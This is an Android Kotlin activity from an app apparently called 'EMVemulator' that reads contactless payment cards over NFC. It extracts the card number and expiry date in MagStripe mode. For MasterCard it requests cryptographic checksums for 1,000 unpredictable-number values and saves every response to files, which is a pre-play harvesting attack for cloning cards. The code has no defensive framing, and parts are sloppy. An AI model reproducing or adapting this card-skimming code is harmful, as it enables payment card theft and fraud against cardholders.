package com.nooan.cardpaypasspass

import android.app.PendingIntent
import android.content.Intent
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.nfc.tech.NfcA
import android.os.Bundle
import android.util.Log
import com.google.android.material.bottomnavigation.BottomNavigationView
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import kotlinx.android.synthetic.main.activity_main.*
import android.os.Environment
import java.io.IOException
import java.util.*
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter


interface OnFragmentInteractionListener {
    fun onClickReadCard(statusRead: Boolean)
}

class MainActivity : AppCompatActivity(), OnFragmentInteractionListener {
    private lateinit var nfcAdapter: NfcAdapter                                                  /*!< represents the local NFC adapter */
    private var tag: Tag? = null                                                                 /*!< represents an NFC tag that has been discovered */
    private lateinit var tagcomm: IsoDep                                                         /*!< provides access to ISO-DEP (ISO 14443-4) properties and I/O operations on a Tag */
    private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name))      /*!<  NFC tech lists */
    private var nfcintent: PendingIntent? = null

    override fun onClickReadCard(statusRead: Boolean) {
        nfcAdapter.enableForegroundDispatch(this, nfcintent, null, nfctechfilter)
        changeState(statusRead)
    }

    fun changeState(statusRead: Boolean) {
        if (!statusRead) {
            //readCard.setText("Stop read")
            nfcAdapter.enableForegroundDispatch(this, nfcintent, null, nfctechfilter)
        } else {
            // readCard.setText("Read card")
            nfcAdapter.disableReaderMode(this)
        }
    }

    override fun onNewIntent(intent: Intent) {
        if (true/* is working*/) {
            super.onNewIntent(intent)
            tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG)
            Log.i("EMVemulator", "Tag detected")
            cardReading(tag)
        }
    }

    private var error = "Error"
    //fixme asynchronisly
    private fun cardReading(tag: Tag?) {

        tagcomm = IsoDep.get(tag)
        tagcomm.connect()
        try {
            tagcomm.connect()
        } catch (e: IOException) {
            Log.e("EMVemulator", "Error tagcomm: " + e.message)
            error = "Reading card data ... Error tagcomm: " + e.message
            return
        }

        try {
            readCardMagStripe()
            tagcomm.close()
        } catch (e: IOException) {
            Log.e("EMVemulator", "Error tranceive: " + e.message)
            error = "Reading card data ... Error tranceive: " + e.message
            return
        }

    }


    private val mOnNavigationItemSelectedListener = BottomNavigationView.OnNavigationItemSelectedListener { item ->
        when (item.itemId) {
            R.id.navigation_emulator_main -> {
                startFragmentTransaction(EmulatorTerminalMainFragment.newInstance())
                return@OnNavigationItemSelectedListener true
            }
            R.id.navigation_logs -> {
                startFragmentTransaction(LogsFragment.newInstance())
                return@OnNavigationItemSelectedListener true
            }
            R.id.navigation_reads -> {
                startFragmentTransaction(ReadFileFragment.newInstance())
                return@OnNavigationItemSelectedListener true
            }
        }
        false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        navigation.setOnNavigationItemSelectedListener(mOnNavigationItemSelectedListener)
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0)
    }

    fun appendLog(text: String, filename: String) {
        val logFile = File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/EMV/", filename)
        if (!logFile.exists()) {
            try {
                logFile.createNewFile()
            } catch (e: IOException) {
                e.printStackTrace()
            }

        }
        try {
            //BufferedWriter for performance, true to set append to file flag
            val buf = BufferedWriter(FileWriter(logFile, true))
            buf.append(text)
            buf.newLine()
            buf.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }

    }

    private fun readCardMChip() {
        try {
            val unixTime = System.currentTimeMillis() / 1000L
            val filename = unixTime.toString() + "-MChip.card"
            appendLog("MChip", filename)

            var response = execute(Commands.SELECT_PPSE) //Get PPSE
            appendLog((response.toHex()), filename)

            response = execute(Commands.SELECT_APPLICATION.apply {
                Nc = response.toHex().substring(80, 102)
                SW1WS2 = "00"
            })
            appendLog((response.toHex()), filename)

            response = execute(Commands.GET_PROCESSING_OPTIONS)  //Get Processing Options
            appendLog((response.toHex()), filename)

            response = execute(Commands.READ_RECORD_1)   //Read Record1
            appendLog((response.toHex()), filename)

            response = execute(Commands.READ_RECORD_2)   //Read Record2
            appendLog((response.toHex()), filename)

            response = execute(Commands.READ_RECORD_3)   //Read Record3
            appendLog((response.toHex()), filename)

            response = execute(Commands.READ_RECORD_4)   //Read Record4
            appendLog((response.toHex()), filename)

            response = execute(Command().apply {
                CLA = "80"
                INS = "AE"
                P1 = "50"
                P2 = "00"
                Lc = "2B"
                Nc = "00 00 00 00 00 00 00 00 00 00 00 00 00 56 00 00 00 00 00 09 78 17 06 21 00 51 33 05 49 22 00 00 00 00 00 00 00 00 00 00 1F 03 02 00"
            })   //Generate ACs
            appendLog((response.toHex()), filename)
            Log.i("EMVemulator", "Done!")

        } catch (e: IOException) {
            Log.i("EMVemulator", "Error readCard: " + e.message)
            error = "Reading card data ... Error readCard: " + e.message
        }

    }

    protected fun toMagStripeMode() = "77 0A 82 02 00 00 94 04 08 01 01 00 90 00"

    private fun readCardMagStripe() {

        try {
            var temp: String

            val unixTime = System.currentTimeMillis() / 1000L
            val filename = unixTime.toString() + "MagStripe.card"
            appendLog("MagStripe", filename)

            var response = execute(Commands.SELECT_PPSE)
            appendLog((response.toHex()), filename)

            val select = Commands.SELECT_APPLICATION.apply {
                Nc = response.toHex().substring(80, 102)
                SW1WS2 = "00"
            }
            val cardtype: String = getTypeCard(select.split())

            response = execute(select)
            appendLog((response.toHex()), filename)
            appendLog(toMagStripeMode(), filename)
            response = execute(Commands.READ_RECORD_1.apply {
                P2 = "0C"
                Lc = "00"
                Nc = ""
            })

            appendLog((response.toHex()), filename)
            var cardnumber: String = "";
            var cardexpiration = ""
            if (cardtype === "MasterCard") {
                cardnumber = "Card number: " + String(Arrays.copyOfRange(response, 28, 44))
                cardexpiration = "Card expiration: " + String(Arrays.copyOfRange(response, 50, 52)) + "/" + String(Arrays.copyOfRange(response, 48, 50))

                for (i in 0..999) {
                    response = execute(Commands.GET_PROCESSING_OPTIONS)
                    response = execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply {
                        Lc = "04"
                        Nc = "00000${String.format("%03d", i)}00".replace("..(?!$)".toRegex(), "$0 ")
                    })

                    appendLog((response.toHex()), filename)
                    Log.i("EMVemulator", "Count:" + i.toString())
                    if (i % 1 == 0) {
                    }
                }
            }
            if (cardtype === "Visa" || cardtype === "Visa Electron") {
                cardnumber = "Card number: " + (response.toHex()).substring(12, 36).replace(" ", "")
                cardexpiration = "Card expiration: " + (response.toHex()).substring(40, 43).replace(" ", "") + "/" + response.toHex().substring(37, 40).replace(" ", "")
            }

            Log.i("EMVemulator", "Done!")

        } catch (e: IOException) {
            Log.i("EMVemulator", "Error readCard: " + e.message)
            error = "Reading card data ... Error readCard: " + e.message
        }

    }

    private fun getTypeCard(response: ByteArray): String {
        var cardtype: String = "";
        if (response.toHex().matches("00 A4 04 00 07 A0 00 00 00 04 10 10 00".toRegex()))
            cardtype = "MasterCard"
        if (response.toHex().matches("00 A4 04 00 07 A0 00 00 00 03 20 10 00".toRegex()))
            cardtype = "Visa Electron"
        if (response.toHex().matches("00 A4 04 00 07 A0 00 00 00 03 10 10 00".toRegex()))
            cardtype = "Visa"
        return cardtype
    }

    @Throws(IOException::class)
    protected fun execute(command: Command): ByteArray {
        val bytes = command.split()
        Log.i("EMVemulator", "Send: " + (bytes.toHex()))
        val recv = tagcomm.transceive(bytes)
        Log.i("EMVemulator", "Received: " + (recv.toHex()))
        return recv
    }

    private fun startFragmentTransaction(fragment: Fragment) {
        supportFragmentManager.beginTransaction()
                .replace(R.id.mainFrame, fragment)
                .commit()
    }
}
